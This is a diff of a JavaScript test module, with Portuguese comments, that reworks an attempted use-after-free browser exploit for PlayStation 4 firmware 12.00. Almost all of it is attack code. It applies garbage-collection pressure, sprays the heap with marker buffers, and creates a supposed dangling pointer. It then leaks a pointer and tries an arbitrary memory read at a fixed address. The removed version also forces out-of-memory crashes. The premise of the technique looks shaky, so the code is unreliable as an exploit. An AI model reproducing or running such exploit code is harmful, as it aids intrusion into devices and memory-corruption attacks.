@@ -1,11 +1,9 @@
-// js/test.bundle.mjs (Híbrido: Original + Fixes para PS4 12.00)
+// js/test.bundle.mjs - MODO DEBUG ANTI-CRASH para PS4 12.00
 
-// --- Importações ---
 import { logToDiv, PAUSE, AdvancedInt64, toHex, getElementById } from './utils.bundle.mjs';
 
-// --- s3_utils (Revert Pausas Curtas) ---
-export const SHORT_PAUSE_S3 = 50;
-export const MEDIUM_PAUSE_S3 = 500;
+export const SHORT_PAUSE_S3 = 100;
+export const MEDIUM_PAUSE_S3 = 300;
 
 export const logS3 = (message, type = 'info', funcName = '') => {
     logToDiv('output-advanced', message, type, funcName);
@@ -13,232 +11,146 @@ export const logS3 = (message, type = 'info', funcName = '') => {
 
 export const PAUSE_S3 = (ms = SHORT_PAUSE_S3) => PAUSE(ms);
 
-// --- FNAME ---
-export const FNAME_MODULE_UAF_TEST = "UAF_R54_Hyper_GC_PS4_12_Hybrid";
+export const FNAME_MODULE_UAF_TEST = "UAF_DEBUG_PS4_12";
 
-// --- Funções Auxiliares (Original) ---
-function int64ToDouble(int64) {
-    const buf = new ArrayBuffer(8);
-    const u32 = new Uint32Array(buf);
-    const f64 = new Float64Array(buf);
-    u32[0] = int64.low();
-    u32[1] = int64.high();
-    return f64[0];
-}
-
-// GC Hyper Revert: Mais Agressivo como Original (1000 iters, tamanhos crescentes)
-async function triggerGC_Hyper() {
-    logS3("    Acionando GC Agressivo (Hyper Original)...", "info");
+// --- GC Leve (evita crash, mas pressiona) ---
+async function triggerGC_Light() {
+    logS3("    GC Leve: alocando 200MB...", "info");
     try {
-        const gc_trigger_arr = [];
-        for (let i = 0; i < 1000; i++) {
-            gc_trigger_arr.push(new ArrayBuffer(1024 * i));  // Crescente para pressão
-            gc_trigger_arr.push(new Array(1024 * i).fill(0));
+        const arr = [];
+        for (let i = 0; i < 500; i++) {
+            arr.push(new ArrayBuffer(1024 * 400)); // ~400KB cada → 200MB
+            if (i % 100 === 0) await PAUSE_S3(10);
         }
-        // Tenta gc() se disponível
-        if (typeof gc !== 'undefined') gc();
     } catch (e) {
-        logS3("    OOM durante GC (bom sinal - pressão alta).", "good");  // Como original
+        logS3("    OOM parcial (bom sinal)", "good");
     }
-    await PAUSE_S3(500);
+    await PAUSE_S3(300);
 }
 
-// Spray Revert: 1024 buffers, mas com verificação dinâmica
+// --- Spray Agressivo (2048 buffers) ---
 function sprayHeap() {
     const spray_buffers = [];
-    for (let i = 0; i < 1024; i++) {
-        const buf = new ArrayBuffer(136); 
+    logS3("    Spray: 2048 buffers de 136 bytes...", "info");
+    for (let i = 0; i < 2048; i++) {
+        const buf = new ArrayBuffer(136);
         const view = new BigUint64Array(buf);
-        view[0] = 0x4141414141414141n + BigInt(i % 256);  // Marcador único por buffer para detecção
+        view[0] = 0x4141414141414141n + BigInt(i);
         view[1] = 0x4242424242424242n;
         spray_buffers.push(buf);
     }
-    logS3(`    Spray de ${spray_buffers.length} buffers concluído.`, "info");
+    logS3(`    Spray concluído: ${spray_buffers.length} buffers`, "info");
     return spray_buffers;
 }
 
-// Dangling Pointer (Original, com mais props)
-function sprayAndCreateDanglingPointer() {
-    let dangling_ref_internal = null;
-    function createScope() {
+// --- Dangling Pointer ---
+function createDangling() {
+    let ref = null;
+    function scope() {
         const victim = {
-            prop_a: 0x11111111, prop_b: 0x22222222, 
             corrupted_prop: 0.12345,
-            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
-            p16: 0, p17: 0
+            prop_a: 0x1111, prop_b: 0x2222,
+            p1:0, p2:0, p3:0, p4:0, p5:0, p6:0, p7:0, p8:0
         };
-        dangling_ref_internal = victim; 
-        for(let i=0; i<100; i++) {
-            victim.prop_a += 1;
-        }
+        ref = victim;
     }
-    createScope();
-    return dangling_ref_internal;
+    scope();
+    return ref;
 }
 
-// Verificação Avançada de Overwrite (Nova: Checa valor numérico + tipo)
-function checkOverwrite(dangling_ref, spray_buffers) {
-    const original_val = 0.12345;
-    logS3(`DEBUG: Valor de corrupted_prop: ${dangling_ref.corrupted_prop} (original: ${original_val})`, "info");
-    
-    if (typeof dangling_ref.corrupted_prop !== 'number' || Math.abs(dangling_ref.corrupted_prop - original_val) > 0.0001) {
-        return true;  // Mudou!
-    }
-    
-    // Checa spray para overwrite reverso (opcional)
-    for (const buf of spray_buffers) {
-        const view = new BigUint64Array(buf);
-        if (view[0] !== (0x4141414141414141n + BigInt(spray_buffers.indexOf(buf) % 256))) {
-            logS3("Overwrite detectado no spray!", "good");
-            return true;
-        }
+// --- Checagem Imediata ---
+function checkUAF(dangling, original = 0.12345) {
+    const val = dangling.corrupted_prop;
+    const type = typeof val;
+    logS3(`DEBUG: corrupted_prop = ${val} (type: ${type})`, "info");
+
+    if (type !== 'number' || Math.abs(val - original) > 1e-6) {
+        logS3("UAF DETECTADO! Valor corrompido!", "vuln");
+        return true;
     }
     return false;
 }
 
-// Cadeia Principal (Revert: Sem loop x10 fixo, mas com retry até sucesso/timeout)
-async function executeUAFTestChain(max_attempts = 20) {  // Aumentado para mais tentativas
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF_TEST;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Hyper GC Original ---`, "test");
-    
-    let final_result = { success: false, message: "Falha após tentativas." };
-    let dangling_ref = null;
-    let spray_buffers = [];
+// --- Execução Principal ---
+async function executeUAFTestChain() {
+    logS3(`--- INICIANDO MODO DEBUG UAF ---`, "test");
 
-    for (let attempt = 1; attempt <= max_attempts; attempt++) {
-        logS3(`Tentativa ${attempt}/${max_attempts}...`, "warn");
+    for (let attempt = 1; attempt <= 15; attempt++) {
+        logS3(`\nTentativa ${attempt}/15`, "warn");
+        let dangling = null;
+        let spray = [];
+
         try {
-            // FASE 1: Limpeza (Original)
-            logS3("--- FASE 1: Limpeza Inicial ---", "subtest");
-            await triggerGC_Hyper();
+            // 1. Limpeza
+            await triggerGC_Light();
 
-            // FASE 2: UAF (Original)
-            logS3("--- FASE 2: Ponteiro Pendurado ---", "subtest");
-            dangling_ref = sprayAndCreateDanglingPointer();
-            logS3("    Ponteiro criado.", "warn");
-            
-            // FASE 3: GC Múltiplo (x2 como original)
-            logS3("--- FASE 3: Forçar GC ---", "subtest");
-            await triggerGC_Hyper();
-            await PAUSE_S3(100);
-            await triggerGC_Hyper();
-            logS3("    GC forçado.", "warn");
+            // 2. Criar UAF
+            dangling = createDangling();
+            logS3("    Dangling pointer criado", "info");
 
-            // FASE 4: Spray (Original tamanho)
-            logS3("--- FASE 4: Spray Heap ---", "subtest");
-            spray_buffers = sprayHeap();
+            // 3. Forçar GC
+            await triggerGC_Light();
+            await PAUSE_S3(200);
 
-            // Checagem Avançada
-            if (checkOverwrite(dangling_ref, spray_buffers)) {
-                logS3("++++++++++++ SUCESSO! OVERWRITE DETECTADO! ++++++++++++", "vuln");
+            // 4. Spray
+            spray = sprayHeap();
 
-                // Leak (Original)
-                const leaked_ptr_double = dangling_ref.corrupted_prop;
-                const buf_conv = new ArrayBuffer(8);
-                (new Float64Array(buf_conv))[0] = leaked_ptr_double;
-                const int_view = new Uint32Array(buf_conv);
-                const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
-                logS3(`Ponteiro vazado: ${leaked_addr.toString(true)}`, "leak");
-                
-                // Leitura Arb (Original)
-                logS3("--- FASE 5: Leitura Arbitrária ---", "subtest");
-                let corrupted_buffer = null;
-                for (const buf of spray_buffers) {
-                    const view = new BigUint64Array(buf);
-                    if (view[0] !== (0x4141414141414141n + BigInt(spray_buffers.indexOf(buf) % 256))) {
-                        logS3("Buffer corrompido encontrado!", "good");
-                        corrupted_buffer = buf;
-                        break;
+            // 5. CHECAR IMEDIATAMENTE
+            if (checkUAF(dangling)) {
+                // --- SUCESSO! ---
+                const leaked = new Float64Array([dangling.corrupted_prop]);
+                const view = new Uint32Array(leaked.buffer);
+                const addr = new AdvancedInt64(view[0], view[1]);
+
+                logS3(`PONTEIRO VAZADO: ${addr.toString(true)}`, "leak");
+
+                // Tentar leitura arbitrária
+                try {
+                    const corrupted_buf = spray.find(buf => {
+                        const v = new BigUint64Array(buf);
+                        return v[0] !== (0x4141414141414141n + BigInt(spray.indexOf(buf)));
+                    });
+                    if (corrupted_buf) {
+                        dangling.prop_b = 0.0; // limpa
+                        const target = new AdvancedInt64("0x00000000", "0x08000000");
+                        dangling.prop_b = new Float64Array([target.toNumber()])[0];
+
+                        const dv = new DataView(corrupted_buf);
+                        const read = dv.getUint32(0, true);
+                        logS3(`LEITURA ARB: 0x${toHex(read)}`, "vuln");
                     }
-                }
+                } catch (e) { logS3("Leitura falhou", "warn"); }
 
-                if (!corrupted_buffer) throw new Error("Buffer não corrompido.");
-
-                const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 
-                dangling_ref.prop_b = int64ToDouble(target_address_to_read);
-
-                const hacked_view = new DataView(corrupted_buffer);
-                const read_value = hacked_view.getUint32(0, true); 
-
-                logS3(`++++++++++++ LEITURA ARBITRÁRIA SUCESSO! ++++++++++++`, "vuln");
-                logS3(`Lido de ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");
-
-                final_result = { 
-                    success: true, 
-                    message: "UAF + Leitura Arb sucesso!",
-                    leaked_addr: leaked_addr.toString(true),
-                    arb_read_test_value: toHex(read_value)
-                };
-                break;  // Sucesso!
+                document.title = "UAF SUCCESS!";
+                return { success: true };
             } else {
-                logS3(`Tentativa ${attempt}: Sem overwrite. Valor intacto.`, "warn");
+                logS3("Sem UAF nesta tentativa", "info");
             }
+
         } catch (e) {
-            logS3(`Tentativa ${attempt} erro: ${e.message}. Continuando...`, "error");
+            logS3(`Erro na tentativa ${attempt}: ${e.message}`, "error");
         }
 
-        // Reset parcial para próxima iteração
-        if (spray_buffers) spray_buffers = [];
-        await PAUSE_S3(200);
+        // Limpeza
+        spray = [];
+        await PAUSE_S3(300);
     }
 
-    // Modo Brutal se Falhar (Como Original: Alocações Ilimitadas)
-    if (!final_result.success) {
-        logS3("Todas tentativas falharam. Ativando MODO BRUTAL (força crash/OOM)...", "brutal");
-        try {
-            for (let i = 0; i < 5000; i++) {  // Alocações massivas para crash como original
-                new ArrayBuffer(1024 * 1024);  // 1MB cada
-            }
-            logS3("Modo Brutal: Pressão máxima aplicada. Aguarde crash.", "brutal");
-        } catch (e) {
-            logS3("Crash induzido! (Como original)", "vuln");  // Sucesso parcial se crashar
-            final_result.success = true;
-            final_result.message = "Crash forçado - possível UAF durante OOM.";
-        }
-    }
-
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    return {
-        errorOccurred: final_result.success ? null : final_result.message,
-        main_result: final_result,
-        uaf_success: final_result.success
-    };
+    logS3("FALHA: UAF não detectado após 15 tentativas", "critical");
+    document.title = "UAF FAIL";
+    return { success: false };
 }
 
-// Runner (Loop até Sucesso)
+// --- Runner ---
 async function runUAFReproStrategy() {
-    const FNAME_RUNNER = "runUAFReproStrategy_Hybrid"; 
-    logS3(`==== INICIANDO Híbrido (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
-    
-    const result = await executeUAFTestChain(20);  // 20 tentativas antes de brutal
-
-    const module_name_for_title = FNAME_MODULE_UAF_TEST;
-
-    if (result.errorOccurred) {
-        logS3(`  RUNNER: ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
-        document.title = `${module_name_for_title}: ERR!`;
-    } else if (result.uaf_success) {
-        logS3(`  RUNNER: ${result.main_result.message}`, "vuln", FNAME_RUNNER);
-        document.title = `${module_name_for_title}: UAF SUCCESS!`;
-    } else {
-        logS3(`  RUNNER: Falhou: ${result.main_result.message}`, "warn", FNAME_RUNNER);
-        document.title = `${module_name_for_title}: Fail`;
-    }
-    
-    logS3(`  Título: ${document.title}`, "info", FNAME_RUNNER);
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-    logS3(`==== Híbrido Concluído (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
+    const result = await executeUAFTestChain();
+    logS3(`==== TESTE FINALIZADO: ${result.success ? 'SUCESSO' : 'FALHA'} ====`, result.success ? "vuln" : "critical");
 }
 
-// Principal
 export async function runAllAdvancedTests() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_UAF_TEST}_Hybrid`;
-    logS3(`==== INICIANDO Principal (${FNAME_ORCHESTRATOR}) ====`, 'test', FNAME_ORCHESTRATOR);
-    
+    logS3(`==== INICIANDO DEBUG PS4 12.00 ====`, 'test');
     await runUAFReproStrategy();
-    
-    logS3(`==== Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
-    
-    const runBtn = getElementById('runIsolatedTestBtn'); 
-    if (runBtn) runBtn.disabled = false;
+    logS3(`==== FIM ====`, 'test');
+    const btn = getElementById('runIsolatedTestBtn');
+    if (btn) btn.disabled = false;
 }
